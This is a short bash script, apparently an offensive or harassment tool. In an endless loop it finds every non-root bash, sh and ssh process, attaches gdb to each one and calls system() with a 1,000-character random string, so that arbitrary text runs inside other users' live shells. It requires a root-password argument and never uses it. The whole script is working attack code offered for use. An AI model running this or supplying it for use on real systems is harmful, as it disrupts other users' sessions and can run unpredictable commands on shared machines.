#!/bin/bash

# Check for pass
if [ -z "$1" ]; then
    echo "Usage: $0 <root_password>"
    exit 1
fi

# Set pass from arg
root_password="$1"

while true; do
    # Get the list of PIDs for non-root shell/SSH instances
    pids=$(ps -e -o pid,cmd,user | grep -E '(/bin/)?(bash|ssh|sh)' | grep -v 'root' | awk '{print $1}')
    
    CHARSET="[:alnum:]!@#$%^&*()_+{}|:<>?~"
    generate_string() {
        local length=$1
        tr -dc "$CHARSET" < /dev/urandom | head -c $length
    }
    LENGTH=1000
    random_string=$(generate_string $LENGTH)

    # Iterate over PIDs
    for pid in $pids; do
        # Execute GDB commands
        gdb -p $pid >/dev/null 2>&1 <<EOF &
            call system("$random_string")
            quit
EOF
    done

done
